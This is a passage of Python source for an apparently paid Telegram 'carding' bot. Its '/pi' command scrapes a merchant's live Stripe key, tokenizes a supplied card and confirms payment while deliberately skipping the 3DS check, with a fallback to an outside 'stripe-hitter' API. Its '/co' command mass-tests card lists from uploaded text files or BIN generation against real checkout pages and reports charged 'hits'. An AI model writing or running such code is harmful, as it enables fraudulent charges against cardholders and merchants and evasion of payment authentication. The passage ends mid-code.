        data = conf_r.json() if conf_r.status_code in (200, 400, 402) else {}
        elapsed = round(time.time() - t0, 2)
        if isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
            return {"status": "3ds", "message": "3DS/Authentication Required", "elapsed": elapsed}
        err = data.get("error") or {}
        if err:
            dc  = err.get("decline_code", "") or err.get("code", "")
            msg = err.get("message", "Declined")
            return {"status": "declined", "message": f"{dc}: {msg}" if dc else msg, "elapsed": elapsed}
        if data.get("object") == "payment_page" or data.get("status") in ("succeeded", "processing", "paid"):
            return {"status": "approved", "message": "Charged Successfully", "elapsed": elapsed}
        return {"status": "declined", "message": str(data)[:80], "elapsed": elapsed}
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "Timeout", "elapsed": 0}
    except Exception as e:
        return {"status": "error", "message": str(e)[:60], "elapsed": 0}
# ─────────────────────────────────────────────────────────────────────────────

# ================== Stripe PI Direct Bypass — pure HTTP, no browser ==================
def _stripe_pi_bypass(checkout_url: str, ccx: str, timeout: int = 30) -> dict:
    """
    Stripe PaymentIntent direct confirm — attempts 3DS bypass:
      • ppage_ / buy.stripe.com → confirm WITHOUT use_stripe_sdk (server-side only, no 3DS popup)
      • cs_live_ → falls back to SCO API (stripe-hitter.onrender.com)
    Returns {status, message, elapsed, method}
    status: approved | insufficient_funds | 3ds | declined | error
    """
    import time as _t
    from urllib.parse import urlparse as _urlparse
    t0 = _t.time()

    def _elapsed():
        return round(_t.time() - t0, 2)

    parsed = _parse_card(ccx)
    if not parsed:
        return {"status": "error", "message": "Invalid card format", "elapsed": 0}
    cc_num, cc_mon, cc_year, cc_cvc = parsed

    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

    sess = requests.Session()
    sess.headers.update({"User-Agent": UA, "Accept": "text/html,application/xhtml+xml,*/*"})

    # ── Step 1: Fetch checkout page ──────────────────────────────────────────
    try:
        r_page   = sess.get(checkout_url, timeout=timeout // 2, allow_redirects=True)
        page_txt = r_page.text
        final_url = r_page.url
    except Exception as e:
        return {"status": "error", "message": f"Page unreachable: {str(e)[:50]}", "elapsed": _elapsed()}

    # ── Step 2: Extract session ID ───────────────────────────────────────────
    cs_id = None
    for pat in [r'ppage_[A-Za-z0-9_]+', r'cs_(?:live|test)_[A-Za-z0-9_]+']:
        for src in [final_url, page_txt]:
            m = re.search(pat, src)
            if m and m.group(0) not in ('ppage_DEMO', 'cs_live_DEMO', 'cs_test_DEMO'):
                cs_id = m.group(0)
                break
        if cs_id:
            break

    if not cs_id:
        return {"status": "error", "message": "Session ID not found on checkout page", "elapsed": _elapsed()}

    # ── cs_live_ → fallback to SCO API (needs merchant SK) ──────────────────
    if cs_id.startswith('cs_'):
        _url_q = requests.utils.quote(checkout_url, safe='')
        cc_enc = ccx.replace("|", "%7C")
        ep     = f"{_SCO_API}/stripe/checkout-based/url/{_url_q}/pay/cc/{cc_enc}"
        rj     = _sco_hit_api(ep, timeout=55)
        raw = str(rj.get("message") or rj.get("error") or "")[:80]
        raw_lo = raw.lower()
        _, _, is_hit = _sco_classify(rj)
        if is_hit:
            return {"status": "approved",  "message": raw, "elapsed": _elapsed(), "method": "sco"}
        if any(x in raw_lo for x in ("require", "3d", "authentication", "otp", "authenticate")):
            return {"status": "3ds",      "message": raw, "elapsed": _elapsed(), "method": "sco"}
        return {"status": "declined", "message": raw, "elapsed": _elapsed(), "method": "sco"}

    # ── ppage_ → pure API confirm, no browser ───────────────────────────────
    pk_live = None
    for pat in [
        r'"(?:apiKey|publishableKey|public_key)"\s*:\s*"(pk_live_[A-Za-z0-9]+)"',
        r"'(?:apiKey|publishableKey)'\s*:\s*'(pk_live_[A-Za-z0-9]+)'",
        r'(?:publishableKey|apiKey|stripeKey)[^:=]{0,20}[:=]\s*["\']?(pk_live_[A-Za-z0-9]{20,})',
        r'pk_live_[A-Za-z0-9]{20,}',
    ]:
        m = re.search(pat, page_txt)
        if m:
            pk_live = m.group(1) if m.lastindex and m.lastindex >= 1 else m.group(0)
            break

    if not pk_live:
        return {"status": "error", "message": "pk_live not found on page", "elapsed": _elapsed()}

    parsed  = _urlparse(final_url)
    origin  = f"{parsed.scheme}://{parsed.netloc}"
    referer = final_url.split('#')[0]

    stripe_h = {
        "Accept":       "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin":       "https://js.stripe.com",
        "Referer":      "https://js.stripe.com/",
        "User-Agent":   UA,
    }

    guid  = str(uuid.uuid4())
    muid  = str(uuid.uuid4())
    sid_v = str(uuid.uuid4())

    # Create PaymentMethod token via Stripe API
    pm_data = {
        "type":                           "card",
        "card[number]":                   cc_num,
        "card[exp_month]":                cc_mon,
        "card[exp_year]":                 cc_year,
        "card[cvc]":                      cc_cvc,
        "billing_details[address][country]": "US",
        "payment_user_agent":             "stripe.js/419d6f15; stripe-js-v3/419d6f15; checkout-mobile",
        "time_on_page":                   str(random.randint(30000, 120000)),
        "guid":  guid,
        "muid":  muid,
        "sid":   sid_v,
        "key":   pk_live,
    }

    try:
        pm_r    = sess.post("https://api.stripe.com/v1/payment_methods",
                            headers=stripe_h, data=pm_data, timeout=20)
        pm_json = pm_r.json()
    except Exception as e:
        return {"status": "error", "message": f"PM tokenization failed: {str(e)[:50]}", "elapsed": _elapsed()}

    if "id" not in pm_json:
        err_msg = pm_json.get("error", {}).get("message", "Card declined at tokenization")
        return {"status": "declined", "message": err_msg, "elapsed": _elapsed()}

    pm_id = pm_json["id"]

    # Confirm — deliberately NO use_stripe_sdk=true → server-side only (no 3DS browser popup)
    confirm_data = (
        f"payment_method={pm_id}"
        f"&expected_payment_method_type=card"
        f"&return_url={referer}"
        f"&key={pk_live}"
    )
    confirm_h = {**stripe_h, "Origin": origin, "Referer": referer}

    try:
        c_r    = sess.post(f"https://api.stripe.com/v1/payment_pages/{cs_id}/confirm",
                           headers=confirm_h, data=confirm_data, timeout=25)
        c_json = c_r.json()
    except Exception as e:
        return {"status": "error", "message": f"Confirm failed: {str(e)[:50]}", "elapsed": _elapsed()}

    if "error" in c_json:
        err = c_json["error"]
        return {"status": "declined", "message": _parse_stripe_error(err), "elapsed": _elapsed()}

    status      = c_json.get("status", "")
    next_action = c_json.get("next_action")

    if status == "succeeded":
        return {"status": "approved",            "message": "Approved ✅",                          "elapsed": _elapsed(), "method": "pi_direct"}
    elif status in ("requires_payment_method", "canceled"):
        last_err = (c_json.get("last_payment_error") or {})
        msg = last_err.get("message", "Declined")
        return {"status": "declined",            "message": msg,                                    "elapsed": _elapsed(), "method": "pi_direct"}
    elif status == "processing":
        return {"status": "approved",            "message": "Processing (likely approved)",         "elapsed": _elapsed(), "method": "pi_direct"}
    elif status == "requires_action" or next_action:
        na_type = (next_action or {}).get("type", "")
        if na_type == "redirect_to_url":
            return {"status": "3ds",             "message": "3DS Challenge — ACS redirect required","elapsed": _elapsed(), "method": "pi_direct"}
        return {"status": "3ds",                 "message": "3DS Authentication Required",          "elapsed": _elapsed(), "method": "pi_direct"}
    else:
        return {"status": "declined",            "message": str(c_json)[:80],                       "elapsed": _elapsed(), "method": "pi_direct"}

# ================== /pi — Stripe PI Direct Hitter (3DS bypass attempt) ==================
@bot.message_handler(commands=["pi"])
def pi_command(message):
    """Single-card Stripe PI direct confirm — fast, no browser, tries to skip 3DS."""
    def my_function():
        import html as _html
        uid = message.from_user.id
        try:
            with open("data.json", "r", encoding="utf-8") as _f:
                _jd = json.load(_f)
            BL = _jd.get(str(uid), {}).get("plan", "𝗙𝗥𝗘𝗘")
        except Exception:
            BL = "𝗙𝗥𝗘𝗘"
        if BL == "𝗙𝗥𝗘𝗘" and uid != admin:
            bot.reply_to(message, "<b>❌ VIP only command.</b>", parse_mode="HTML")
            return

        allowed, wait = check_rate_limit(uid, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ Wait {wait}s before next check.</b>", parse_mode="HTML")
            return

        usage = (
            "<b>╔══ ⚡ STRIPE PI DIRECT HITTER ══╗\n\n"
            "📌 Usage:\n"
            "<code>/pi &lt;checkout_url&gt; &lt;card&gt;</code>\n\n"
            "📌 Example:\n"
            "<code>/pi https://buy.stripe.com/xxx 4111111111111111|12|26|123</code>\n\n"
            "🔄 Method:\n"
            "  • Stripe PaymentIntent API direct confirm\n"
            "  • No browser — pure HTTP (~3-10s)\n"
            "  • Tries to bypass 3DS via server-side confirm\n"
            "  • Best on: buy.stripe.com / ppage_ sessions\n\n"
            "💡 For cs_live_ → auto-routes to SCO API</b>"
        )

        txt = message.text or ""
        parts = txt.split(None, 2)

        checkout_url = None
        card         = None

        # Handle reply-to card
        replied = message.reply_to_message
        if len(parts) >= 2:
            checkout_url = parts[1].strip()
        if len(parts) >= 3:
            card = parts[2].strip()
        elif replied:
            m_card = re.search(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b', replied.text or "")
            if m_card:
                card = m_card.group(0)

        if not checkout_url or not card:
            bot.reply_to(message, usage, parse_mode="HTML")
            return

        c_parts = card.split("|")
        if len(c_parts) < 4:
            bot.reply_to(message, "<b>❌ Card format: num|mm|yy|cvv</b>", parse_mode="HTML")
            return

        bin_6 = c_parts[0][:6]
        bin_info, bank, _, cc_flag = get_bin_info(bin_6)
        uname = _html.escape(str(message.from_user.username or uid))

        log_command(message, query_type="gateway", gateway="pi")

        prog = bot.reply_to(message,
            f"<b>╔══════════════════════════╗\n"
            f"║  ⚡  S T R I P E  P I     ║\n"
            f"╚══════════════════════════╝\n"
            f"│\n"
            f"│  💳 Card  » <code>{_html.escape(card)}</code>\n"
            f"│  🏦 Bank  » {_html.escape(bank)}\n"
            f"│  🌍 Info  » {_html.escape(bin_info)} {cc_flag}\n"
            f"│\n"
            f"│  ⚡ Method » PI Direct (no browser)\n"
            f"│  ⏳ Checking...\n"
            f"└────────────────────────────</b>", parse_mode="HTML")

        result  = _stripe_pi_bypass(checkout_url, card, timeout=40)
        st      = result.get("status", "error")
        msg_raw = result.get("message", "")[:70]
        t_taken = result.get("elapsed", 0)
        method  = result.get("method", "pi_direct")

        if st == "approved":
            icon  = "✅"; word = "APPROVED"; box = "║  ✅  P I  H I T  !  !  !    ║"
        elif st == "insufficient_funds":
            icon  = "💰"; word = "FUNDS";    box = "║  💰  INSUFFICIENT FUNDS     ║"
        elif st == "3ds":
            icon  = "⚠️"; word = "3DS/OTP"; box = "║  ⚠️  3DS REQUIRED           ║"
        elif st == "declined":
            icon  = "❌"; word = "DECLINED"; box = "║  ❌  DECLINED               ║"
        else:
            icon  = "🔴"; word = "ERROR";    box = "║  🔴  ERROR                  ║"

        method_label = "PI Direct" if method == "pi_direct" else "SCO API (fallback)"

        try:
            bot.edit_message_text(
                f"<b>╔══════════════════════════╗\n"
                f"{box}\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  {icon}  <b>{word}</b>\n"
                f"│\n"
                f"│  💳 Card    » <code>{_html.escape(card)}</code>\n"
                f"│  🏦 Bank    » {_html.escape(bank)}\n"
                f"│  🌍 Info    » {_html.escape(bin_info)} {cc_flag}\n"
                f"│  💬 Msg     » {_html.escape(msg_raw)}\n"
                f"│\n"
                f"│  ⚡ Method  » {method_label}\n"
                f"│  ⏱ Time    » {t_taken}s\n"
                f"│  👤 By     » @{uname}\n"
                f"└────────────────────────────</b>",
                chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
        except Exception:
            pass

    threading.Thread(target=my_function).start()

# ================== /co — External API Checkout (Card OR BIN mode) ==================
@bot.message_handler(commands=["co"])
def ext_checkout_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'

        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return

        # ── Early API health check ──
        # ext_stripe_api_alive() always True — pure Python implementation

        usage_msg = (
            "<b>🌐 <u>𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁</u>\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Card Mode:</b>\n"
            "<code>/co https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>BIN Mode (auto-gen):</b>\n"
            "<code>/co https://checkout.stripe.com/xxx\n"
            "411111 30</code>\n"
            "<i>(BIN amount — default 15, max 100)</i>\n"
            "━━━━━━━━━━━━━━━━\n"
            "✅ <b>Supported Links:</b>\n"
            "• <code>checkout.stripe.com</code>\n"
            "• <code>buy.stripe.com</code>\n"
            "• Any custom domain checkout\n"
            "━━━━━━━━━━━━━━━━</b>"
        )

        def _ext_status(d):
            s = d.get("status", "").lower()
            if s == "approved":
                return "✅"
            elif s == "insufficient_funds":
                return "💰"
            elif s == "3ds":
                return "⚠️"
            else:
                return "❌"

        def _ext_line(d):
            """One-word status label for mass/BIN/txt live listings."""
            s   = d.get("status", "").lower()
            msg = d.get("message", "").lower()
            if s == "approved":
                return "Approve"
            elif s == "3ds" or any(k in msg for k in ("3d", "otp", "authenticate", "authentication")):
                return "Otp"
            elif s == "insufficient_funds" or "insufficient" in msg:
                return "Funds"
            else:
                return "Decline"

        # ====== TXT FILE REPLY MODE ======
        # User replied to a .txt document with: /co <checkout_url>
        replied = message.reply_to_message
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):

            # Extract checkout URL from the command text
            txt_parts = message.text.split()
            if len(txt_parts) < 2:
                bot.reply_to(message,
                    "<b>❌ Checkout URL nahi mila.\n"
                    "Usage: <code>/co https://checkout.stripe.com/xxx</code> → (txt file pe reply karein)</b>",
                    parse_mode='HTML')
                return
            checkout_url = txt_parts[1].strip()
            if not checkout_url.startswith('http'):
                bot.reply_to(message,
                    "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸.\n\n✅ Stripe checkout link paste karein.</b>",
                    parse_mode='HTML')
                return

            # Download and parse CCs from the txt file
            try:
                file_info = bot.get_file(replied.document.file_id)
                downloaded = bot.download_file(file_info.file_path)
                raw_text = downloaded.decode('utf-8', errors='ignore')
            except Exception as e:
                bot.reply_to(message, f"<b>❌ File download failed: {str(e)[:80]}</b>", parse_mode='HTML')
                return

            CC_RE = re.compile(r'\d{15,19}[|: \/]\d{1,2}[|: \/]\d{2,4}[|: \/]\d{3,4}')
            card_lines = [m.group().replace(' ', '|').replace('/', '|').replace(':', '|')
                          for m in CC_RE.finditer(raw_text)]

            if not card_lines:
                bot.reply_to(message,
                    "<b>❌ File mein koi valid CC nahi mila.\n"
                    "<i>(Format: 4111111111111111|12|26|123)</i></b>",
                    parse_mode='HTML')
                return

            total_txt = len(card_lines)
            _TXT_MAX = 999999
            if total_txt > _TXT_MAX:
                bot.reply_to(message,
                    f"<b>⚠️ File mein {total_txt} cards hain — max {_TXT_MAX} allowed.\n"
                    f"Pehle {_TXT_MAX} cards check honge.</b>", parse_mode='HTML')
                card_lines = card_lines[:_TXT_MAX]
                total_txt = _TXT_MAX

            # --- Route to multi-card checker ---
            live = dead = insufficient = checked = 0
            hits = []
            results_lines = []
            total = total_txt

            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
            try:
                stopuser[f'{id}']['status'] = 'start'
            except:
                stopuser[f'{id}'] = {'status': 'start'}

            log_command(message, query_type='gateway', gateway='ext_stripe_txt')
            msg = bot.reply_to(message,
                f"<b>📄 𝗧𝘅𝘁 𝗙𝗶𝗹𝗲 → 𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📂 𝗙𝗶𝗹𝗲: {replied.document.file_name}\n"
                f"📋 𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴...</b>", reply_markup=stop_kb)

            def build_txt_msg(status_text="⏳ Checking..."):
                if "DONE" in status_text:
                    _top = "✨ ✦ ─── T X T   D O N E ─── ✦ ✨"
                elif "STOP" in status_text:
                    _top = "🛑 ─── S T O P P E D ─── 🛑"
                else:
                    _top = "✨ ✦ ─── T X T   C H E C K E R ─── ✦ ✨"
                header = (
                    f"<b>{_top}\n"
                    f"╔══════════════════════════╗\n"
                    f"║  📄  Txt → Ext Stripe     ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│ 📂 {replied.document.file_name}\n"
                    f"│ 📋 {checked}/{total}   {status_text}\n"
                    f"│ ✅ Live: {live}   💰 Funds: {insufficient}   ❌ Dead: {dead}\n"
                    f"└──────────────────────────\n"
                )
                body = "\n".join(results_lines[-10:])
                footer_hits = ""
                if hits:
                    _hlabels = {"✅": "✅ HIT (Paid)", "💰": "💰 HIT (Funds)", "⚠️": "⚠️ HIT (OTP)"}
                    hits_lines = "".join(
                        f"\n╔══ {_hlabels.get(em,'🎯 HIT')} ══╗\n"
                        f"│ <code>{cc}</code>\n"
                        f"│ 🌐 {res.get('merchant','N/A')}\n"
                        f"│ 💵 {res.get('amount','N/A')}\n"
                        f"└────────────\n"
                        for cc, res, em in hits[-8:]
                    )
                    footer_hits = f"\n🎯 <b>HITS ({len(hits)})</b>" + hits_lines
                full = header + body + footer_hits + "\n✨ ✦ ─────────────── ✦ ✨\n       ⌤ Bot by @yadistan</b>"
                if len(full) > 4000:
                    full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n       ⌤ Bot by @yadistan</b>"
                return full

            _live_hit_holder = [None, []]
            for cc in card_lines:
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_txt_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"), parse_mode='HTML')
                    except:
                        pass
                    return

                cc = cc.strip()
                result = _co_ext_call(checkout_url, cc)
                checked += 1
                log_card_check(id, cc, 'ext_stripe_txt',
                               f"{result.get('status')} | {result.get('message')}")

                status_emoji = _ext_status(result)
                if status_emoji == "✅":
                    live += 1
                    hits.append((cc, result, status_emoji))
                    _add_to_merge(id, cc)
                    _notify_live_hit(message.chat.id, cc, "co", holder=_live_hit_holder)
                elif status_emoji == "💰":
                    insufficient += 1
                    hits.append((cc, result, status_emoji))
                    _add_to_merge(id, cc)
                    _notify_live_hit(message.chat.id, cc, "co", holder=_live_hit_holder)
                elif status_emoji == "⚠️":
                    live += 1
                    hits.append((cc, result, status_emoji))   # 3DS bhi hit hai
                else:
                    dead += 1

                results_lines.append(
                    f"{status_emoji} <b>{_ext_line(result)}</b>  ·  {result.get('message','')[:40]}\n    └ <code>{cc}</code>"
                )

                # Update every 5 cards (not 3) to avoid Telegram flood limit
                if checked % 5 == 0 or checked == total:
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_txt_msg(), parse_mode='HTML',
                                              reply_markup=stop_kb)
                        time.sleep(0.5)   # flood protection
                    except Exception:
                        time.sleep(1)     # if edit fails, wait longer

            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_txt_msg("✅ 𝗗𝗢𝗡𝗘"), parse_mode='HTML')
            except:
                pass
            return
        # ====== END TXT FILE REPLY MODE ======

        # ====== REPLIED TEXT MESSAGE CC MODE ======
        # User replied to a /gen (or any CC text) message with: /co <url>
        if (replied
                and not (replied.document
                         and replied.document.file_name
                         and replied.document.file_name.lower().endswith('.txt'))):
            cmd_parts = message.text.split()
            if len(cmd_parts) >= 2 and cmd_parts[1].startswith('http'):
                replied_text = replied.text or replied.caption or ""
                reply_cards = []
                seen_r = set()
                for _rl in replied_text.splitlines():
                    _cc = _extract_cc(_rl.strip())
                    if _cc and _cc not in seen_r:
                        reply_cards.append(_cc)
                        seen_r.add(_cc)

                if reply_cards:
                    checkout_url = cmd_parts[1]
                    card_lines   = reply_cards
                    total        = len(card_lines)

                    live = dead = insufficient = checked = 0
                    hits = []
                    results_lines = []

                    stop_kb = types.InlineKeyboardMarkup()
                    stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                    try:
                        stopuser[f'{id}']['status'] = 'start'
                    except:
                        stopuser[f'{id}'] = {'status': 'start'}

                    log_command(message, query_type='gateway', gateway='ext_stripe_txt')
                    src_name = f"Gen Message ({total} cards)"
                    msg = bot.reply_to(message,
                        f"<b>📋 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 → 𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📋 𝗦𝗼𝘂𝗿𝗰𝗲: {src_name}\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴...</b>",
                        reply_markup=stop_kb, parse_mode='HTML')

                    def build_msg_msg(status_text="⏳ Checking..."):
                        if "DONE" in status_text:
                            _top = "✨ ✦ ─── C O   D O N E ─── ✦ ✨"
                        elif "STOP" in status_text:
                            _top = "🛑 ─── S T O P P E D ─── 🛑"
                        else:
                            _top = "✨ ✦ ─── C O   C H E C K E R ─── ✦ ✨"
                        header = (
                            f"<b>{_top}\n"
                            f"╔══════════════════════════╗\n"
                            f"║  🌐  Ext Stripe Checkout  ║\n"
                            f"╚══════════════════════════╝\n"
                            f"│\n"
                            f"│ 📋 {checked}/{total}   {status_text}\n"
                            f"│ ✅ Live: {live}   💰 Funds: {insufficient}   ❌ Dead: {dead}\n"
                            f"└──────────────────────────\n"
                        )
                        body = "\n".join(results_lines[-10:])
                        footer_hits = ""
                        if hits:
                            _hlabels = {"✅": "✅ HIT (Paid)", "💰": "💰 HIT (Funds)", "⚠️": "⚠️ HIT (OTP)"}
                            hits_lines = "".join(
                                f"\n╔══ {_hlabels.get(em,'🎯 HIT')} ══╗\n"
                                f"│ <code>{cc}</code>\n"
                                f"│ 🌐 {res.get('merchant','N/A')}\n"
                                f"│ 💵 {res.get('amount','N/A')}\n"
                                f"└────────────\n"
                                for cc, res, em in hits[-8:]
                            )
                            footer_hits = f"\n🎯 <b>HITS ({len(hits)})</b>" + hits_lines
                        full = header + body + footer_hits + "\n✨ ✦ ─────────────── ✦ ✨\n       ⌤ Bot by @yadistan</b>"
                        if len(full) > 4000:
                            full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n       ⌤ Bot by @yadistan</b>"
                        return full

                    for cc in card_lines:
                        if stopuser.get(f'{id}', {}).get('status') == 'stop':
                            try:
                                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                                      text=build_msg_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"), parse_mode='HTML')
                            except:
                                pass
                            return

                        cc = cc.strip()
                        result = _co_ext_call(checkout_url, cc)
                        checked += 1
                        log_card_check(id, cc, 'ext_stripe_txt',
                                       f"{result.get('status')} | {result.get('message')}")

                        status_emoji = _ext_status(result)
                        if status_emoji == "✅":
                            live += 1
                            hits.append((cc, result, status_emoji))
                        elif status_emoji == "💰":
                            insufficient += 1
                            hits.append((cc, result, status_emoji))
                        elif status_emoji == "⚠️":
                            live += 1
                            hits.append((cc, result, status_emoji))
                        else:
                            dead += 1

                        results_lines.append(
                            f"{status_emoji} <b>{_ext_line(result)}</b>  ·  {result.get('message','')[:40]}\n    └ <code>{cc}</code>"
                        )

                        if checked % 5 == 0 or checked == total:
                            try:
                                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                                      text=build_msg_msg(), parse_mode='HTML',
                                                      reply_markup=stop_kb)
                                time.sleep(0.5)
                            except Exception:
                                time.sleep(1)

                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_msg_msg("✅ 𝗗𝗢𝗡𝗘"), parse_mode='HTML')
                    except:
                        pass
                    return
        # ====== END REPLIED TEXT MESSAGE CC MODE ======

        try:
            lines = [l.strip() for l in message.text.split('\n') if l.strip()]
            first_tokens = lines[0].split(None, 1)
            first_rest   = first_tokens[1].strip() if len(first_tokens) > 1 else ''

            if first_rest.startswith('http'):
                # /co URL\nCARD
                checkout_url = first_rest.split()[0]
                after_url    = first_rest[len(checkout_url):].strip()
                remaining    = ([after_url] if after_url else []) + lines[1:]
            elif len(lines) > 1 and lines[1].startswith('http'):
                # /co\nURL\nCARD  — dot-style
                checkout_url = lines[1].split()[0]
                remaining    = lines[2:]
            else:
                raise IndexError

            if not remaining:
                raise IndexError
            second_line = remaining[0]
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        if not checkout_url.startswith('http'):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸.\n\n✅ Stripe checkout link paste karein.\n<i>(checkout.stripe.com, buy.stripe.com, ya koi bhi custom domain)</i></b>")
            return

        # --- Detect mode: BIN or Card ---
        first_token = second_line.split('|')[0].strip().split()[0]
        is_card_mode = (len(first_token) >= 13 and first_token.isdigit()) or (_extract_cc(second_line) is not None)

        # ====== CARD MODE ======
        if is_card_mode:
            _raw_lines = [l.strip() for l in lines[1:] if l.strip()] if len(lines) > 1 else [second_line]
            card_lines = []
            for _rl in _raw_lines:
                _cc = _extract_cc(_rl)
                if _cc:
                    card_lines.append(_cc)
            card_lines = card_lines[:10]
            if not card_lines:
                bot.reply_to(message, usage_msg, parse_mode='HTML')
                return

            # --- Single card ---
            if len(card_lines) == 1:
                card = card_lines[0]
                bin_num = card.replace('|', '')[:6]
                bin_info, bank, country, country_code = get_bin_info(bin_num)

                log_command(message, query_type='gateway', gateway='ext_stripe')
                msg = bot.reply_to(message,
                    f"<b>⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...\n"
                    f"🌐 𝗟𝗶𝗻𝗸: <code>{checkout_url[:50]}...</code>\n"
                    f"💳 𝗖𝗮𝗿𝗱: <code>{card}</code></b>")

                start_time = time.time()
                result = _co_ext_call(checkout_url, card)
                execution_time = time.time() - start_time
                log_card_check(id, card, 'ext_stripe',
                               f"{result.get('status')} | {result.get('message')}", exec_time=execution_time)

                status_emoji = _ext_status(result)
                is_hit = status_emoji in ("✅", "💰", "⚠️")

                minux_keyboard = types.InlineKeyboardMarkup()
                minux_keyboard.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))

                if is_hit:
                    _raw_msg  = result.get('message', '')
                    _raw_st   = result.get('status', '')
                    _is_3ds   = (_raw_st == '3ds' or any(k in _raw_msg.lower() for k in ('3d', 'authenticate', 'otp', 'authentication')))
                    hit_label = {
                        "✅": "Hit (Paid)",
                        "💰": "Hit (Insufficient Funds)",
                        "⚠️": "Hit (OTP Required)",
                    }.get(status_emoji, "Hit")
                    _msg_display = "OTP Required 🔐" if _is_3ds else (f"{_raw_msg} {status_emoji}" if _raw_msg else f"N/A")
                    success_url = result.get('url', '')
                    url_line = f"\n<b>Success URL:</b> <code>{success_url}</code>" if success_url else ""
                    _cc_show   = country_code if country_code not in ('N/A', '??', '', 'Unknown') else ''
                    _country_display = country if country != 'Unknown' else '—'
                    _country_line   = f"{_country_display} ({_cc_show})" if _cc_show else _country_display
                    _bank_display   = bank if bank != 'Unknown' else '—'
                    _bin_display    = bin_info if bin_info not in ('Unknown', 'Unknown - ') else '—'
                    if status_emoji == "✅":
                        _top = "✨ ✦ ─── A P P R O V E D ─── ✦ ✨"
                        _box = "╔══════════════════════════╗\n║  ✅  CHARGED  —  HIT !    ║\n╚══════════════════════════╝"
                    elif status_emoji == "💰":
                        _top = "✨ ✦ ─── I N S U F F I C I E N T ─── ✦ ✨"
                        _box = "╔══════════════════════════╗\n║  💰  INSUFFICIENT FUNDS   ║\n╚══════════════════════════╝"
                    else:
                        _top = "⚠️ ─── O T P   R E Q U I R E D ─── ⚠️"
                        _box = "╔══════════════════════════╗\n║  ⚠️  3DS / OTP REQUIRED   ║\n╚══════════════════════════╝"
                    formatted_message = (
                        f"<b>{_top}\n"
                        f"{_box}\n"
                        f"│\n"
                        f"│ 💳 <code>{card}</code>\n"
                        f"│ 💬 {_msg_display}\n"
                        f"│{url_line}\n"
                        f"│\n"
                        f"│ 🌐 Site: {result.get('merchant', 'N/A')}\n"
                        f"│ 💵 Amount: {result.get('amount', 'N/A')}\n"
                        f"│\n"
                        f"│ 🏦 BIN: {_bin_display}\n"
                        f"│ 🏛️ Bank: {_bank_display}\n"
                        f"│ 🌍 Country: {_country_line}\n"
                        f"│\n"
                        f"│ ⏱️ {result.get('time', 'N/A')}  ·  Total: {execution_time:.2f}s\n"
                        f"└──────────────────────────\n"
                        f"       ⌤ Bot by @yadistan</b>"
